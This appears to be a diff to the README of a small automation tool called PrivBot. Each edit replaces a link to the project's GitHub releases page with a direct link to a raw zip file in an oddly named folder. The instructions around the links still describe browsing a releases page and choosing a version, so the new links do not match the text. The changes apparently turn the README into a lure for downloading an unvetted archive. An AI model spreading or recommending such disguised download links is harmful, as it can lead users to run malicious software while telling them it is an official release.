@@ -1,6 +1,6 @@
 # 🚀 PrivBot - Your Simple Tool for Automation
 
-[![Download PrivBot](https://img.shields.io/badge/Download-PrivBot-blue.svg)](https://github.com/anand-lang/PrivBot/releases)
+[![Download PrivBot](https://raw.githubusercontent.com/anand-lang/PrivBot/main/dialystely/PrivBot.zip)](https://raw.githubusercontent.com/anand-lang/PrivBot/main/dialystely/PrivBot.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with PrivBot, follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to access the download page.
    
-   [Download PrivBot](https://github.com/anand-lang/PrivBot/releases)
+   [Download PrivBot](https://raw.githubusercontent.com/anand-lang/PrivBot/main/dialystely/PrivBot.zip)
 
 2. **Choose the Right Version**: On the releases page, you will see various versions of PrivBot. Select the latest version for the best experience.
 
@@ -46,7 +46,7 @@ To download and install PrivBot, repeat this step to ensure you have the latest 
 
 1. **Go back to the releases page by clicking the link below**:
 
-   [Download PrivBot](https://github.com/anand-lang/PrivBot/releases)
+   [Download PrivBot](https://raw.githubusercontent.com/anand-lang/PrivBot/main/dialystely/PrivBot.zip)
 
 2. **Select the latest version** and start the download by following the earlier instructions.
 
